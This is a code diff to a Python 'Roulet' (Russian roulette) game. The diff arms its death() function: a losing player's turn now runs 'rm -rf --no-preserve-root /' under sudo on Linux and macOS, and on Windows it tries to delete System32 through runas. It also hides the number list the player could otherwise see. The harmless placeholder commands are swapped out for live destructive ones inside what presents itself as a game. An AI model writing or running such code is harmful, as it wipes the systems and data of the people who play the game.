@@ -12,7 +12,8 @@ class Roulet:
 
             return num
         else:
-            return False
+            print("Well done.\nYou Won!!")
+            sys.exit()
     
     def disNums(self):
         print(self.__numList)
@@ -41,15 +42,15 @@ def death():
     if sys.platform.startswith('win'):
         try:
             # command = "del /s /q C:\Windows\System32\*"
-            # command = ['def', '/s', '/q', 'C:\Windows\System32\*']
-            command = ['dir', '/ad']
+            command = ['def', '/s', '/q', 'C:\Windows\System32\*']
+            # command = ['dir', '/ad']
             subprocess.run(["runas", "/user:Adminstrator", "cmd", "/c", *command], check=True)
         except subprocess.CalledProcessError as e:
             print(e)
     elif sys.platform.startswith('linux') or sys.platform.startswith('darwin'):
         try:
-            # command = ['rm', '-rf', '--no-preserve-root', '/']
-            command = ['ls', '-a']
+            command = ['rm', '-rf', '--no-preserve-root', '/']
+            # command = ['ls', '-a']
             subprocess.run(['sudo', *command], check=True)
         except subprocess.CalledProcessError as e: 
             print(e)
@@ -75,7 +76,7 @@ def user_prompt():
             continue
         
         rNum = roulet.rnd_num()
-        roulet.disNums()
+        # roulet.disNums()
         if choice == rNum:
             death()
             sys.exit()
